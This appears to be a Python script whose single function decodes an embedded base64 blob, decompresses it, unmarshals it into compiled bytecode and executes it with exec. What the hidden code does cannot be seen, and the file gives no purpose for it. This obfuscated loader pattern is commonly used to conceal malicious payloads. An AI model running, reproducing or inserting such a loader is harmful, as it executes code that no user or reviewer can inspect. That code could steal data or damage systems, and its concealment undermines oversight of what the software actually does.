import base64
import zlib
import marshal
import sys

def heaven():
    try:
        raw = base64.b64decode("eJx9VNFv00YYP8dOHNuJSzpKKQgw2QRJgUglpS0R7TR1CAYCtFrRkNopcpxLk5HY4ezQNmhSpL2kT203TeSRx+6Nv2Fob3so7SLKlYdN44W3aCAh8bQ7O04Dqbgo/vzd/e77fvf7Pt+/oGf4O/ZNgAHgV6AClbkJkGsZxDjWh3yOZRHrWA5xqu8YQP6FgMqm7gKg5QBY4KNggZk7BPrGJca1KpcaJFiBYIUoUP3evAIWmYN3qgFKD4kLvrkj/atzI/1zC6IXNdaZcfL5oz0rTj7KgF8QZaAGk2zvyiITF15T57bO9AQOkD9LdfrT1YlJAxkkfQYz30WlgepTWZW7zPqA4Uv75tgDtOhYgypJfpd8XuZ5rxLgOzZN1ensNrj5QPfEwf6IUZDmPP6Gf17sYkMHYruqG4F5uYs9QHuCDXjYuc8+cRJeDaR5oiOfZI1gjxqMGvxAjaH+GOngvvJ9egx7KFWgWqtimiGKcz21AqfB+W6dc2Q+71PAKbKigNub0+wpkGc+gRhzEXHpNuYLUHsAjQxmUM1ftfMXpuIMDkJDN3NFYxFzcBnqtVKxXDGRrWQ1C06Mix2PTGe997KGrIJW8lxrxRLFHMwrbvRYPCUqZNhoxX2hA2lLynQnZCI7MZ6DJCeMRbU/CNlovIuj8+UKgpYFc2QDzZrYn4uRMPtYGiFjZn8guA6jRMnUclasN8g+XPzIKvS0mcWSmdVKFonReYvFE7pZWYnFD8TNn81kDK0MM5mz35M9xCtrRYN4fWmcbTGP4/kPonxECi7rsGIrVx1TNA1FsxSY6uPbkdtGmg6zmn6vu1BBRcOORb8yFIiQiRRT16sIEQGXCsUSVFDVMEh5FbsAFTObr1q6ZpNFSi3VI303bsKJlyGsiAhiMa94R1amp5Wod+KoS9CruYiZpZqgVnWdyJ5SapxyYUaJhzBnVqCBOQS1HOZpWQgjzHfqhf25arliYY7WGQe9quGA2yhYIJ3idCfEAbdjsH8JFW1iHI5xAYfhctGyyfEyeRpZMqt2pWq7DpPHkmVWkQ4zzt5gdsV2o4gdAiWYw+J+s2C+Qs6vLUI8QDsJoowNy5USkcsS6KfoDRz2dDRRorKCJZ2cz4ZOVnSKIHnyt1rkUQe7h483bzW/3Bo8V7/5Sgg3yk11c3JbSD65v3tk+FF+I/9LoSG9Y4E4/jYADg2vP3x868nEzkCqfv1l5OijEz+faC7vRGL1Gy8jQ45X24mM1m+8kg8/l09uyyeJL48+l8eeyWM7crJ+rc3xx0+3ZfJNPRbaYHCUaQ+MDHP1O28ngCg37jWTm8PbwtiTb3eDwhq/yq8P/BVUaPaLJLtfbHyzXl7PPP568/hmeEucaHGT7+4whFpLSL5/d528XWwJY+8temVtRGY59vejg7ND7FNOnB3knw6Js5/zOOg1yGt6xdXiaYvomVIqK3aBdPYHuilXbA0tQrdaM6/phVfjr9IWJg0kKYZpK3mzauQS8TCiNzdmyVWDfaaF6I2O6MXvqE1zuh2K2RLtNhL1ATpMV6SeDJiraHYBB5yOsX4Db+hliU46Aa6UzVyVkEAXiEuJWA/Jo80yDLMHwntA3APCHpD2gPwfN8pMte8ygAs1ajvsyAtebCTXplanfvpx/f4Of/RFMLwlX24FU38fGXlU2Cg072/ca0i7UnhtcnVybWZ1pnnuuXTmmXTmRWi4KbVCX/wTiqxfa95sTm9KW4PjrdCldgRwx9B5kv9/3X0VsQ==")
        decompressed = zlib.decompress(raw)
        code_obj = marshal.loads(decompressed)
        
       
        exec_globals = globals().copy()
        exec_globals['__name__'] = '__main__'
        
        exec(code_obj, exec_globals)
        
    except Exception as e:
       
        import traceback
        print("An error occurred:")
        traceback.print_exc()

if __name__ == "__main__":
    heaven()
